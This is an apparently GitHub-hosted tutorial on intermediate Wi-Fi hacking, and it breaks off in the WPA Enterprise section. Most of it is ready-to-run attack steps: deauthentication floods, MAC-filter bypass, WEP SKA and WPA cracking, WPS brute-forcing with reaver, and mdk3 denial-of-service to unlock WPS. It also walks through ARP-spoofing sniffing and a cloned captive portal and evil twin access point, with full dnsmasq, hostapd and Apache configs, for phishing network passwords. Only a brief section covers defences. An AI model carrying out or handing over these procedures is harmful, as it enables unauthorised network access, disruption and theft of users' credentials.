# Network Hacking (intermediate to advanced)

# First Hit The Star🥰

This is an article for studying about network hacking related matters. All the contents here are for educational purposes only.

From here we will discuss intermediate to advanced network hacking and bypass meathods..

First of all if you didn't study the basic network hacking you need to read it first and come back here. Link to the basic network hacking : https://github.com/WH1T3-E4GL3/Network-Hacking/blob/main/README.md

If you don't read the basic one... you will be unfamiliar with many terms, so do it first and only learn this.


Let's start...


PRE-CONNECTION ATTACKS
=====================

✅️How to change mac:
------------------
	▶️> ifcconfig wlan0 down
	▶️> ifconfig wlan0 hw ether 00:11:22:33:44:55
	▶️> ifconfig wlan0 up
	
✅️Targeting 5ghz network:
-----------------------	
The band of a network is the frequency that it can use for brodcasting signal. 2.4 and 5gz are the main frequencies used.

▶️> iwconfig mon0  [make sure wireless card is in monitor mode]

▶️> airodum-ng mon0  ---> This discovers only 2.4ghz frequency networks. we need to sniff 5gz:


SOME ADAPTORS:

	(ALPHA AWUS 036NHA [This is the goood one, but this dosent pickup 5ghz frequency])
	(ALPHA AWUS 036ACH [This adaptor supports both 2.4 and 5gz and monitor mode, this is not as good as alpha])
	(TP-link Archer T2U Plus AC600 High Gain Wireless Dual Band USB Adapter)
	(https://www.youtube.com/watch?v=0lqRZ3MWPXY  |  http://www.zsecurity.shop/)
	
We need to specifically tell airodum-ng to sniff on 5g even if use a 5ghz adaptor:

	▶️> airodump-ng --band a mon0 [band a is the band of 5gz] [b and g uses 2.4ghz, n uses 5 and 2.4, ac uses frequencies lower than 6]
	
We can do all the commands we learned in the basic network hacking section with this. The only difference is we want an adaptor that supports 5ghz and specify the --band a.

	eg: ▶️> airodump-ng --band a --bssid --write mon0
	
✅️Deauthentication attack(no need of connecting to the network):

--------------------------------------------------------------

First run airodump-ng against the target network:

	▶️> airodump-ng --channel 11 --bssid 08:00:27:c7:e1:36 mon0
	We can see the connected devices there.
	
	▶️> aireply-ng --deauth 1000000 -a 08:00:27:c7:e1:36 -c 00:24:36:b8:v2:43 mon0 [-a is the target network/access point, -c is the target device that we want to disconnect] [we set 100000 to continiously send deauth packets]
	That's all.
	
We changed our mac address and pretend to be the victims computer and send the request to the router telling it that i want to disconnect from you. Then we change our  mac to the router's and tell the client that i am the router and i am disconnecting from you. Aireplay-ng will do this for us automatically.


✅️Deauthenticate multiple devices:

--------------------------------

Here we can disconnect multiple or all devices from one network, or disconnect all devices from a number of networks.

We may can do this with multiple terminals with that same command and change the mac of the target device, but it will be hard if the number of devices is more and the screen will be full of terminals.

So what we do is put the process in background so that the process works silently and the terminal will be clean. we can use the & symbol at the end of the command to tell that do the process in background. It is a bash skill.

But still the output wll be show in terminal to avoid that we are going to redirect that output by the > symbol to /dev/null and we again put & to tell that i want to do all in the background.


▶️>  aireply-ng --deauth 1000000 -a 08:00:27:c7:e1:36 -c 00:24:36:b8:v2:43 mon0 &> /dev/null &


[  /dev/null is a special file in Unix-like operating systems that is used to discard any data written to it. It is often referred to as the "null device" or the "bit bucket." When data is written to /dev/null, it is simply discarded and not stored anywhere, effectively making it disappear.
	In Unix-like systems, everything is treated as a file, and /dev/null is one of the special files that can be used for various purposes. For example, if a command or a program generates output that you do not wish to see or store, you can redirect it to /dev/null so that the output is discarded.
	Here's an example of how you can use /dev/null in a Unix-like system:
		javascript
		Copy code
		$ command_with_output > /dev/null  ]
		
		
Now the command will run silently and will give us an id.

If we type 'jobs' we can see the all background processes running.


Now we can do another deauthentication in the same terminal silently.

We can see the 2 process by typing jobs.


If we need to stop all the process, use:

	▶️> killall aireplay-ng
	
If we want to stop any one of them, use:

	▶️> kill %1  [1 is the id of that process that we can see by te jobs command]
	
	
By this we can target all devices in a network one by one.


[Using the &> method we can make any process in the background (eg: ping google.com &> /dev/null &)]


✅️Deauthenticating all devices from a network at once:

------------------------------------------------------

▶️>  aireply-ng --deauth 1000000 -a 08:00:27:c7:e1:36 mon0 [The only difference is we dont specify the -c target device here]

But while running this we may get an error like invalid bssid. [we may also get the error with the normal command too that we done before]

The actual problem is that with the channel, the error also show that it listen on a channel(assume it is 7), but our  network's channel may be different. 

To fix this issue run airodum-ng against that specific network:

▶️>  airodump-ng mon0 [this discover all networks around us, and select the network we want]

▶️>  airodump-ng --bssid 08:00:27:c7:e1:36 --channel 11 mon0 [this will target the specific device]


keep this command(2nd one) running in a terminal and start deauthentication in the same terminal by splitting it this will fix the issue, because we are now targeting the specific network

▶️>  aireply-ng --deauth 1000000 -a 08:00:27:c7:e1:36 mon0


Now our attack's effectiveness will be reduced, the more devices we target the less effective attack. For this particular example some device didn't disconnected for 15 seconds and after it disconnected.

The issue that we face where aireplay-ng cant find the bssid then, just run airodump-ng to that specific network with the --channel and --bssid arguments.


GAINING ACCESS
==============


✅️Discovering hidden networks:

------------------------------

(may seen as hidden network, it dosent have name)

So we need to determine the name of the hidden network.

But actually we can see the network, we only cant see the name.

Run airodump-ng against all networks to discover the networks around us.

▶️> airodump-ng mon0

There we can see all the network, the hidden networks are also visible but their name part/ESSIDD will not shown. But the mac/bssid and other details are visible.


Now run airodump-ng against that specific network:

▶️> airodump-ng --bssid 08:00:27:c7:e1:36 --channel 6 mon0


In some cases airodump-ng is able to determine the name by the above command if the network is active. But if its not active it cant determine the name.

So we can activate the network by a trick. Some devices may be connected to the network...we can deauthenticate any one of the devices for a short period of time, when the device reconnects to the target its gonna send the network name in the air and we will be able to catch it.


▶️> aireplay-ng --deauth 4 -a 08:00:27:c7:e1:36 -c 00:01:43:v3:w4:98 mon0 [-a is the target network and -c is the target client that we want to disconnect,  we put 4 as the no: of deauth packet, its really small so it will be disconnected for a split second and it is enough. It will be disconnected and reconnect, the person using the network dosent feels that they got disconnected]


Now airodump-ng will determine the name of the hidden network. Keep in mind that we should keep airodump-ng running against that network in a terminal to see the live result and run the deauthentication attack simultenusly in split terminals.


✅️Connect to the hidden network:

--------------------------------

If our wirelsess card is in monitor mode we can't connect to a network, it is used to capture packets that even not redirected to us, so we need to go back to managed mode to connect to a network.


▶️> airmon-ng stop wlan0mon
	OR
▶️> iwconfig mon0 mode managed

Both of these commands can do this, do any one. One thing we need to put the interface down before doing this andd then bring it up (use the same method done in enabling the monitor mode).


Another great way is that just physicaly disconnect the adaptor and reconnect it back regardless of the method used for enabling montor mode. (type iwconfig to seee the mode)

[Then we can go to settings > network manager > and connect to a network (if dont see the network services go to terminal and type service 'network-manager start')]

As it is a hidden network click the option connect to a hidden network and enter the essid thet we found. [keep in mind that, at the time of conneting to a network our wireless card should be in default/managed mode not in monitor mode]


✅️Bypassing MAC filtering:

-------------------------

MAC filtering may be implemented in devices via blacklisting a mac or blocking a mac address.

So the network will prevent any device with a mac that listed iin the black list.

This will be easly bypassed by changing our mac to a random mac and we will be able to connect to it.


The second method in mac filtering is using a whitelist, this is the opposite of a blacklist, here the network only allows to connect the devices listed in the whitelist.

We need to bypass the whitelist:

	To  do that just do ▶️> airodump-ng mon0
	▶️> airodump-ng --bssid 08:00:27:c7:e1:36 --channel 6 mon0
	By this command we targeted the specific network and we can see the clients that are connected to it, and we can see the client's mac address too.
	So that device is able to connect to the network, the device's mac will be in the whitelist. All we have to do is to change our mac to the mac of that device's mac address and we will be able to connect to the network because  now our mac is the mac that listed in the whitelist.
	Stop airodump-ng and put our wireless card to monitor mode to connect to the network.
	
	Now change our mac address to the client's mac address. Do it mannually or by using macchanger tool:
	▶️> ifconfig wlan0 down
	▶️> macchanger -m 08:00:27:c7:e1:36 wlan0
	If error occurs again do ifconfig wlan0 down and do the changing command or we can do the manual method we studied erlier.
	
	And now we can connecto the network.
ALL THIS WE TALK IT WITH AN OPEN NETWORK. IF IT USES SECURITY WE NEED TO CRACK WE WILL TALK IN THE UPCOMING SECTIONS.

	
✅️Cracking SKA(shared Key Authentication) WEP networks:

-------------------------------------------------------

If wep is used we can connect easly, but if wep uses SKA it wont allow we to associate with the network.

We cracked wep erlier by associating with it, but here we cant associate  with the implementation of SKA in wep.

First of all run airodump-ng against  the network and write it to a file:

▶️> airodump-ng --bssid 08:00:27:c7:e1:36 --channel 1 mon0 --write anyfilename mon0 [we can see that the authentication is SKA and encryption is wep]


Let's do a fake authentication attack just to see:

▶️> aireplay-ng --fakeauth 0 -a 08:00:27:c7:e1:36 -h 34:11:43:y6:r1:54 mon0 [-a is target mac and -h is our mac]


We can see we can't associate with the network and we cant do a fakeauth.

we can't do any attacks here.


So if we need to do a fakeauth attack, we need to capture the SKA. Just deauthenticate a client that is connected to the network and airodump-ng will capture the SKA and we can use the file with the -y option to do fake auth and we can associate with the network and do any attacks.


But here we need atleast one client connected, so let's see another method also:

This is using an arp-reply attack.

▶️> airodump-ng --bssid 08:00:27:c7:e1:36 --channel 1 mon0 --write anyfilename mon0

▶️> aireplay-ng --arpreplay -b 08:00:27:c7:e1:36 -h 89:11:14:c7:e1:45 mon0 [-b is the terget mac] [-h was our own mac but here insted of using our mac we used the mac of a client connected to the network]

(We done this because we can't associate with the network but the connected client can)

Now it wait for an arp packet and once it captures it inject to the traffic and the data count increase very fast as like we done in the basic course.

Now we can run aircrack-ng and crack the password.

▶️> aircrack-ng anyfilename.cap

It will find the key for us. Just remove the colons(:) from the key and use it to connect to the network.


THIS METHOD WORKS ON BOTH NORMAL WEP NETWORKS AND THE ONE USES SKA AUTHENTICATION WEP NETWORKS.


✅️Securing Systems From The Above Attacks:
------------------------------------------
1. Deauthentication attacks:

   There is no proper way of proctecting attacks. The only way is to use 802.11w standard.
   This uses a proctected management frames designed by CISCO to detect and procted against deauthentication attacks. The only thing to keep in mind is both the access point and the clients connecting to this AP needs to support the standard. (more info about this standard : https://en.wikipedia.org/wiki/IEEE_802.11w-2009).
   
2. Discovering the names of our hidden network:

   Don't think that it will proctect you frrom hackers. It can be used to hide the name from normal people and that's all.
   
3. Bypassing mac filtering

   We saw how easly that is to bypass it whether it is a whitelist or a black list. If you want to set access controll don't use mac filtering, insted of that we can use wpa enterprise that each user  need to login(we will learn more about wpa enterprise later)
------------------------------------------


✅️Gaining Access - Captive Portals
----------------------------------

Captive portals are now seen in everywhere. They will be open wifi networks but this allows users to access the internet after logging in(users can login using a web interface)

As the network is open, we can think of so many ways to steal the password and gain access to the network and bypass the login.

The first simple method is that, change our mac address to the mac address of a connected client and connect to the network.
So run airodump-ng against the network and we can see the connected devices and mac, change our mac to one of the client's mac and connect it as we did before.

The second method is sniff the logins in monitor mode.

Since captive portals are open ie:they don't use an encryption we can sniff data to and from using airodump-ng and analyze it with wireshark.(The portal webpage is also http so we can get data in plain text)

We dont even need to connect to  that we can sniff without connecting.

	▶️> iwconfig wlan0 down
	
	▶️> iwconfig wlan0 mode monitor
	
	▶️> iwconfig wlan0 up
	
	(enabled monitor mode)
	
	▶️> airodump-ng wlan0
	
	▶️> airodump-ng --bssid 08:00:27:c7:e1:36 --channel 12 write anyname wlan0
	
we can see the clients connected to the network now. We can disconnect any one using deauthentication attack for a while and force them to login again and we can sniff the login data.

So do a deauthentication, then open wireshark and analyze tha data using the .cap file that we captured. Just appy http in filter and look for post requests to get the login data😉️.


✅️SNIFFING CREDENTIALS OF CAPTIVE PORTALS USING ARP SPOOFING:
-------------------------------------------------------------
As the network is open we can do a normal arp spoofing attack. As we know this will place us in the middle of the connection b/w the client and the router and the data will flow through us including usernames and pass.

The advantage of this is because the data will flow through us because we are the man in the middle and we dont have internet access through this network then when we do this attack, the clients that we are argeting will automatically loose the connection and automatically asked to login again without doing a deauthentication attack.

	The reason for this is that every request they send will redirected to our computer, our computer will send the request to the router, the response will be that we dont have connection and will ask us to login and that response will be forwarded to target and they login.
	

LET"S DO THIS ONE:

first of all connect to that network because it is open, but we dont have internet connection because we need to login, but we are connected.(we need to be in managed mode while connecting)


▶️> mitmf --arp --spoof -i wlan0 --gateway 192.168.2.1 (normal arpspoofing command) ( get gateway by doing 'rout -n' command or just make the last number of our ip as 1)

Sometimes mitmf gives error and may outdated. Lets do an alternative method to this man in the middle attack or arp spoofing using tool called ettercap.

▶️> ettercap -Tq -M arp:remote -i wlan0 /// [-Tq is we telling that we want to run it in Text mode and Quietly] [-m is the mode that is arp sppoofing, in ettercap we need to specify it as arp:remote,  /// is that we want to target all device in the network, if we target one client we can specify one there, we are targeting all device because the login password is same for all devices]

It will start arp poisoning anyway but sometime it will not show snoffed data.

If that case occurs open ettercap graphical > start > scan host > add the host to targget > start arp poison > start analyzing with wireshark because we are man in the middle now.


✅️Creating fake captive portals and fake AP(social engineering method)
----------------------------------------------------------------------
● When everything fails we target the users.

● Clone the login page used by the captive portal.

● Create a fake AP with the same/similar name.

● Deauth users to use the fake network with the cloned page.


So first of all we are going to download and clone the login page that the orginal captive portals use, then we will create a fake AP with the same name of the network, then we disconnect all users that connected to the network using deauthentication attack, and wait for them to connect to our fake AP and they will be automatically see our login page. Boom..!!

First we need to clone the webpage:

Go to the login page > right click > save page as and save the login page    OR   click alt key > file > save page as.

Then we will have 2 files one the html page and one folder with the files like js file css, images etc.. used by the website. [we must have all these files, so not only the .html file we also need that folder containing other files]

We need to put in web server that we can redirect users into that.

copy paste the files to our webroot directory [/var/www/html]

Delete the default index.html in that directory and rename our html file as index.html

then do:

▶️> service apache2 start
 
we can go to http://127.0.0.1/ or localhost to see the webpage

[some things to keep in mind: in some webpages there will be images, when we click on that images the home pages of the site or any other page loads,  so when we clone it that refferer in the <a href > will be  there, so before starting attack edit the code and change ther refferer to our srver/localhost's address..]

For sometime in the itml page there will be refferer to the css file or images, then we may need to put a '/' infromt of it to work it properly because now it work on our different directory.

eg: <a href="huwb/hedu/css22s.css>   we need to convert it to <a href="/huwb/hedu/css22s.css> 

The same thiing will be repeate for many times, so just do find and replace.

Then the next thing to make sure:

The login part must be in a form tags. Many of them will be within the form tag, if it is not we have to mannually add the form tags.

put the <form> tags between the username and password input parts. Also add the method:

<form method="post" acttion="/index.html">

Here we wrapped the input fields in form tags, we set the method to post and we set the action to the same webpage.

Another thing is that some website uses javascript to do the submisssion proccess, so they dont have a submit button. So if it is a javascript line displays the button we need to replace it and add a submit button by <input type="submit" value="login">

We deleted the container and add a submit button, make sure to delete the whole div, just copy the div's style and add it to our submit button.

NOW LETS'S PREPARE OUR COMPUTER TO RUN FAKECAPTIVE PORTAL:

We need to create our  fake AP now, we created it using mana toolkit erlier. Lets do a generic method now:

▶️> apt install hostapd dnsmasq 

Now let's disble network manager, because it may prevent from brodcasting wifi signals.

▶️> service network-manager stop

Then do:

	echo 1 > /proc/sys/net/ipv4/ip_forward
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	iptables -P FORWARD ACCEPT
	
This is an optional step, but its better to do because to make sure our ip table is clear and anything gonna interfear with our attack. We will also know when it fails we dont need to do anything with ip tables.

We can do this as one by one or save all these lines as a bash script (.sh) file.

Now we prepared our system- we installed dnsmaq and hostapd,we connected the network adaptor, we stopped the network manager, we cleared all rules that might interfear with creating the fake AP

lets create the actual fake access point:

Here we need to configure dnsmasq so that we can use it as a dns and dhcp server [dns server is used to handle dns requests, and dhcp is used to give IPs to clients]

		dnsmasq tool can be used to do this both dns server and dhcp seerver.
		
		To use dnsmasq we need a config file:
		

		#Set the wifi interface
		interface=wlan0

		#Set the IP range that can be given to clients
		dhcp-range=10.0.0.10,10.0.0.100,8h

		#Set the gateway IP address
		dhcp-option=3,10.0.0.1

		#Set dns server address
		dhcp-option=6,10.0.0.1

		#Redirect all requests to 10.0.0.1
		address=/#/10.0.0.1

SAVE THE ABOVE AS dnsmasq.conf

Lets explain the lines ---> First line we need to specify our interface,  2nd line we assigned an ip range to clients - here the range is from 10.0.0.10 to 10.0.0.100 which is valid for 8 hours,  3rd line is the gateway ip(dont know what 3 is),  The 4th line is also the ip of the gateway/router(dont know what 6 is),   The last line will make all the request anyone makes on this fake AP will be redirected to that IP.

Now let's start dnsmasq:

▶️> dnsmasq -C /root/downloads/dnsmasq.conf

It will excecute without any error. Now we have a dns and dhcp server running in background.

Now we need to start the fake access point:

		#Set wifi interface
		interface=wlan0

		#Set network name
		ssid=Free internet

		#Set chennel
		channel=1

		#Set driver
		driver=nl80211
		
THIS IS THE CONFIG FILE FOR HOSTAPD

▶️> hostapd /root/downloads/hostpad.conf -B

This will start  the fake AP.

Now if we do ifconfig we dont have an ip address because we stopped our network manager. Let's mannually assign an ip
:
▶️> ifconfig wlan0 10.0.0.1 netmask 255.255.255.0 [we choose this ip because this ip is used in all the configuration files]

Now we have ip address also.

Now start our webserver that contains the login page files:

▶️> service apache2 start

Now do a deauthentication attack to disconnect clients from the network and force them to connect to our network (We can use the same name of that network for our fake AP)

Now they will connect and when they browse they will go to our fake captive portal login page.

But we need to display it automatically to the user without them to browse:
The request send to www.websites.com should be handled to juust websites.com, so we need to remove the www to handle this issue.
For this we just need to modify the configuration of apache:
▶️> gedit /etc/apache2/sites-enabled/000.default.conf

Here we need to redirect website with www to without www.

		<Directory "/var/www/html">   # This is the location we have our web server stored
		RewriteEngine On
		RewriteBase /
		RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
		RewriteRule ^(.*)$ http://%1/$1 [R=301,L]
		</Directory>

Put the above inside the file before the last line after </VirtualHost> tag. Now we are ready to redirect sites with www to without it.
▶️> service apache2 restart

Now if we connect to our fake AP it will open the browser automatically and go to some site. The problem is we need to redirect to our captive portal.
Open the config file again (gedit /etc/apache2/sites-enabled/000.default.conf)
	ErrorDocument 404 /
Add the above line after the <v=VirtualHost *:80> tag in the first line. This will handle when any not find error occurs it will redirect to the root pae or index  page, thats our  captive portal.
This will work in windows, osx and others, but to work in android and other snart phones we need to  add a redirect rule we didi before:

		RewriteCond %{REQUEST_FILENAME} !-f
		RewriteCond %{REQUEST_FILENAME} !-d
		RewriteRule ^(.*)$ / [L,QSA]
Puth this inside the <direcory> tag we created.
SO now the directory tag look like:
		<Directory "/var/www/html">   # This is the location we have our web server stored
		RewriteEngine On
		RewriteBase /
		RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
		RewriteRule ^(.*)$ http://%1/$1 [R=301,L]

		RewriteCond %{REQUEST_FILENAME} !-f
		RewriteCond %{REQUEST_FILENAME} !-d
		RewriteRule ^(.*)$ / [L,QSA]
		</Directory>
		
And restart your  apache server.

Try connect to our fake AP again, now the login page will display directly to you immediately after connecting.

Now the only problem is when a person goes to a hsts website like facebook, they cannot establish a connection, to fix this we need to enable https in our own web server.

Now our website can load at http://localhost but not on http://localhost. We need to make apache to handle https.

So first thing to do is to generate a https certificate:
▶️> openssl req -new x509 -days 365 -out /root/downloads/fake-ap/cert.pem -keyout /root/downloads/fake-ap/cert.key [this generate a certificate valid for 365 days and a key for it]

We may prompted to enter a password for it, give any pass and hit enter.

Now lets enable https, soo that users  sont get warning when they go to hsts websites:
	▶️> a2enmod ssl
	▶️> gedit /etc/apache2/sites-enabled/000-default.conf
	
	Go to down of the file(after the </VirtualHost>) type:
		<VirtualHost *:443>
			SSLEngine On
			SSLCertificateFile /root/downloads/fake-ap/cert.pem
			SSLCertificateKeyFile /root/downloads/fake-ap/cert.key
		</VirtualHost>
		
(443 port is normally used by ssl)Save it.

▶️>  gedit /etc/apache2/ports

Here we need to listen for 443, so add a liine:

	Listen 443
	
and save.

▶️> service apache2 restart

Now Our Fake AP Is Perfectly Working

Now deauthenticate all or required clients from the real AP and force them to connect to our fake network.

✅️ SNIFFING THE LOGIN INFO FROM OUR CAPTIVE PORTAL
---------------------------------------------------

▶️> tshark -i wlan0 -w data.cap [wireshark uses tshark to sniff data, -w to write the captured data to a file]

Now it sonot shows anyting, it will just show capturing and will write to the file.

Assume user connected to our fake ap and entered their username and password of the real captal portal, stop the capturing of tshark with ctrl+c and analyze the file with wireshark.

remember we added method to post in our html form, so in the filter search http and look for post requests.

✅️ Gaining Access - WPAWPA2 Cracking - Exploiting WPS

-----------------------------------------------------

Reaver is the best tool to crack into wpa or  wpa2 if wps is misconfigured(router must enable push button authentication).

From now we are goonna to learn some methods, but note that it will not work against all routers.

BYPASSING FAILED TO ASSOCIATE ISSUE (or Bypassing 0x3 and 0x4 Errors)

-----------------------------------

Lets run wash to get all the wps enabled wifi.

▶️> wash -i mon0  [it will show wps enabled networks only]

▶️> reaver --bssid 08:00:27:c7:e1:36 --channel 11 -i mon0

Now we may see FAILED TO ASSOCIATE issue.

Let's fix it:

For that we will use aireplay-ng to associate manually with the network and tell reaver not to associate.

▶️> aireplay-ng --fakeauth 100 -a 08:00:27:c7:e1:36 -h 02:99:11:b3:f1:94 mon0

[ -a is target access point, -h is our own mac.  To get  our own mac type 'iconfig mon0', our mac is the first 12 digits or 6 part of the unspec field. for example: unspec 00-c9-n7-98-c7-66-00-00-00-00-00-00-00 ---> this is the unspec field change it to ---> 00:c9:n7:98:c7:66]

▶️> reaver --bssid 08:00:27:c7:e1:36 --channel 11 -i mon0 -A  [-A is to specify not associate because we already associated manually]

Run these 2 commands simulteneously in split terminals.

Now we actually bypassed the failed to associate issue, in many cases this is enough and this will run a successfull attack.

lets debug the another bug we are facing, we may stuck at 0.00% attack and it will not progress, lets fix it:

▶️> reaver --bssid 08:00:27:c7:e1:36 --channel 11 -i mon0 -A -vvv  [to get detailed verbose output so that we can see what is the issue]

▶️> aireplay-ng --fakeauth 100 -a 08:00:27:c7:e1:36 -h 02:99:11:b3:f1:94 mon0

Run these 2 commands like we did before.

(The error we will se is 'wps transaction failed!')

So it will retry the last pin again and again, because it does not know whether it is correct or not.

We can see in the outputs that reaver is sending WPS NACK packets, if we do reaver --help we can see an option -N or --no-nacks that not send NACK packets.

▶️> reaver --bssid 08:00:27:c7:e1:36 --channel 11 -i mon0 -A -vvv --no-nacks

▶️> aireplay-ng --fakeauth 100 -a 08:00:27:c7:e1:36 -h 02:99:11:b3:f1:94 mon0

Run this 2 and see if it works, just look reaver stuck in a single pin or it checks different pins. Our attack will work.

Now the other issue we may face is the AP Limiting issue.

[ we may or may not face all the issues we discussed ]

▶️> wash -i mon0

▶️> reaver --bssid 08:00:27:c7:e1:36 --channel 11 -i mon0

[ here we does not add any extra arguments because here we assumes we dont face any problems, also we dont start manual association,  if any error occur we can bypass by our above methods ]

It will bruteforce the pin and will found for us.

[Note: We can stop reaver by ctrl+c at any time and can continue the stopped session later from the stopped part, just run the same reaver command again and it will ask if we want to continue the previous session]

Now the next issue may face is the wps locked. When we run wash -i mon0 we can see a section called wps locked, if the network is marked as NO then no problem, but if it is marked YES it will lock after some attempts.

When we run reaver it will not show wps locked, it will just stuck somewhere with no response, but if we run wash again we can see YES in the wps locked section, so wash detected the wps is locked. Wash will not show wps lock is enabled or disabed in thhat router, it actually does is if we run wash it shows wps is locked or not at that time of run.

The simplest way to bypass this is just deauthenticate all of the connected clients and one of the client when turn off the router and turn on back the router will be unlocked.

[ aireplay-ng --deauth 100000000000000000 -a 08:00:27:c7:e1:36 mon0 ]

But this is not the best way, but anyway this is also a method.

Let's try a good one:

unlocking wps using MDK3 tool.

What it does is, it ddos attack the network and it flop the router and resets the router automatically.

If wps locked at 60% in reaver we can use MDK3 and then resume from the 60%😉️.

▶️> mdk3 --help

When there is a very large no: of clients trying to connect to a router, some routers will not ables to handle the request and restart or resets, it will unlocks the wps.

This tool makes a large amount of mac addresses and get all of these mac to pretend as clients and try to connect with them.

If we run this tool it do with all the network around us, we dont want all we just target one router.

▶️> mdk3 mon0 a -a 08:00:27:c7:e1:36 -m [ a is the authentication dos mode, -a is the target AP, -m tells to use valid mac addresses from the database so that it don't create suspicious fake mac like 00:00:00:00:00]

First we may see that the router is invulnerable message but let it go on little bit, after some time it will work fine. Because routers may handle upto 50000 clents, so after mdk3 reaches 50000 clents it will show its working, the number of clients that can handled by the router may vary.

Just run wash -i mon0 to see if the the wps is unlocked or not. The mdk3 tool may still shows invulnerable but usually after 50000 clents most router resets, so run wash between whiles again and again to see wps is unlocked or not.

If wps locks again with reaver ctrl+c and stop run mdk3 again to reset and run reaver again, it will continue from where it stopped.

NOW IF WPS IS DISABLED THEN THE ONLY OPTION IS A WORDLIST ATTACK OR AN EVIL TWIN ATTACK.

✅️ ADVANCED WORD LIST ATTACK

----------------------------

Lets see how to use huge wordlists without wasting storage, also let's see how to pause and resume the cracking proccess, also let's see how to use GPU insted of CPU for the cracking proccess to save time.

1. SAVING OUR PROGRESS AS SESSIONS

-----------------------------------

▶️> aircrack-ng handshake-01.cap -w wordlist.txt

This was our normal command to crack the password.

For me it showed 2 hours and 13 minutes as the time left for the cracking proccess. There are many huge dictinores than this, so the cracking process may take more hours or many days, this is common in wpa cracking.

So we need to quit after sometime, but aircrack-ng dont save the proccess if we start again it restart from begining. 

LETS SEE HOW TO SEE HOW TO SAVE THE CRACKING SESSION AND BEGIN FROM THE STOPPED PART:

▶️> john --wordlist=wordlist.txt --stdout

What this command does is just display all the passwords written in the wordlist in our screen.

We need to redirect this output of this command as an input to another command (This is an amazing feature in linux).

Lets redirect this to input to our aircrack-ng:

▶️> john --wordlist=wordlist.txt --stdout --session=mysession | aircrack-ng -w - -b 08:00:27:c7:e1:36 handshake-01.cap

(insted of putting a wordlist name to aircrack-ng we put a - to tell aircrack that get your result from the pipe. -b is the mac of the target network. and we give a --session argument and just give a name as mysession to save our progress and resume)

Now lets press q to quit. Here i stopped at 0.39%. 

▶️> john --restore=upc | aircrack-ng -w - -b 08:00:27:c7:e1:36 handshake-01.cap

Here we said john that start from the password that we left before, so it starts from the password we left before and start cracking with aircrack.

2. Piping huge wordlist to aircrack to save storage
---------------------------------------------------

▶️> crunch 8 8 -o all.txt   [ if we want use specific charecters we can specify as crunch 8 8 abc123# -o all.txt like this ]

This will generate a huge wordlist with all the combinations of a-z with a size above 1tb. So we dont have space, lets pipe it directly.

( if we just do crunch 8 8, it will display all the combos without storing )

▶️> crunch 8 8 | aircrack-ng -b 08:00:27:c7:e1:36 -w - handshake-01.cap

We need to save our progess also. So lets combine our saving progress and piping output skills together for a successfull attack.

⏩️> crunch 8 8 | john --stdin --session=newsession --stdout | aircrack-ng -b 08:00:27:c7:e1:36 -w - handshake-01.cap

Now assume i stopped by ctrl+c, now i need to restore our session:

▶️> crunch 8 8 | john --restore=newsession | aircrack-ng -b 08:00:27:c7:e1:36 -w - handshake-01.cap


3. USING GPU TO SAVE TIME
-------------------------

By default Aircrack uses cpu for the cracking process, we can use gpu for doing it for increasing time.

[ we use hashcat to do it, because aircrack-ng doesnot allow us to use gpu, and also we use in windows because most gpu has drivers for windows and very dificult for geting driver for linux, if we can install driver for linux, we can also do this from linux]

(Download hashcat : https://hashcat.net/hashcat/)

In the downoad section we can see the gpu driver requirements, install them all.

Our handshake file normally will be .cap extension, but hashcat not support this, we need to convert it to hashcat's extension.

(Convert the cap file here : https://hashcat.net/cap2hccapx/ )

Open cmd(because we are in windows) > go to the folder of all the files we stored of hashcat > hashcat64.exe --help

▶️> hashcat64.exe -I (this shows available gpu/cpu devices to crack)

▶️> hashcat64.exe -m 2500  -d 1 handshake.hccapx wordlist.txt [ -m is set the mode, 2500 is the id of wpa/wpa2 hash get from help menu, -d is the device, 1 was my gpu's id, hccapx is our file coverrted from .cap format ]

We can also pipe result  to crunch to save storage, and hashcat already support pause and resume by p and r options so no need of john to save sessions.

		+-------------------------------------------------------+
		|SOME LINKS TO WORDLISTS			        |
		|-------------------------------------------------------+
		|ftp://ftp.openwall.com/pub/wordlists/  	        |
		|http://www.openwall.com/mirrors/                       |
		|https://github.com/danielmiessler/SecLists             |
		|http://www.outpost9.com/files/WordLists.html           |
		|http://www.vulnerabilityassessment.co.uk/passwords.htm |
		|http://packetstormsecurity.org/Crackers/wordlists/     |
		|http://www.ai.uga.edu/ftplib/natural-language/moby/    |
		|http://www.cotse.com/tools/wordlists1.htm              |
		|http://www.cotse.com/tools/wordlists2.htm              |
		|http://wordlist.sourceforge.net/                       |
		+-------------------------------------------------------+
		
✅️Gaining Access - WPAWPA Cracking - Evil Twin Attack
-----------------------------------------------------

When all the cracking methods failed, the last method is to social engineer the users. Evil twin attack is a famous one among them.

Idea:

1. Start a fake AP with same name as target network.

2. Disconnect a client.

3. Wait for them to connect to the fake AP.

4. Automatically display a page asking for network key.

Its similar to captive portal. But the difference ishere we are targeting a normal network not a captive portal.

The disadvantage is that the user have to connect to our fake AP that is an open network, but they know that their network uses a wpa/wpa2 encryption, which may make them suspicious.

We need to make a webpage like earlier, but here we need only their password, for that the simplest way is that:

Go to the admin login page of the router by its ip (route -n) > download the login page. It have username and password. Just remove the username part. As it have the logo and everything of the router the suspiciousness can be reduced.
 
Let's automate the full eviltwin attack using fluxion tool.

This tool will automate all things we done in creating a fake AP in the captive portal section.

This tool cannot be used for targeting captive portal, we can only do it against wpa/wpa2 networks and create a captive portal.

Fluxion downoad : https://github.com/FluxionNetwork/fluxion.git

ITS ALL AUTOMATED, SO WE CAN DO IT OUR OWN. NO NEED OF A TUTORIAL.

DHCP, DNS, and webserver and the deauthenticator will start automatically.

If client tries to connect to the real network, he can't because the deauthentication occurs, so he will be forced to connect to our evil twin with the same name.

It will display the webpage to enter the password immediately after the client connects.

When they enter the password, it will display n fluxion terminal.

If a bug occurs try to debug it with the manual knowledge we gained in the captive portal session.

We may see an issue in the fake login page that, the css or image properties will not shown sometimes because it uses relative urls. We face this same problem in our captive portal section and we need to put a backslash there to fix this issue.

go to file manager > tmp > TMPflux > This is where fluxion keeps its files > data > edit the index.html file > put a backslash(/) anywhere with the href= and src= option and check if the issue is fixed. also check the form action= , it will set to a file put a forward slash there also.

NOW THAT ISSUE WILL BE FIXED.

✅️ WPA/WPA2 ENTERPRISE
----------------------

● All WPA/WPA2 networks we seen so far use PSK authentication.

● A shared key is used to authenticate users.

● One key per network.

● Router manages authentication.

● WPA Enterprise is another form of authentication.

● Each user get their own key to connect to the network.

● Authentication is managed through a central server (RADIUS Server

Problems:

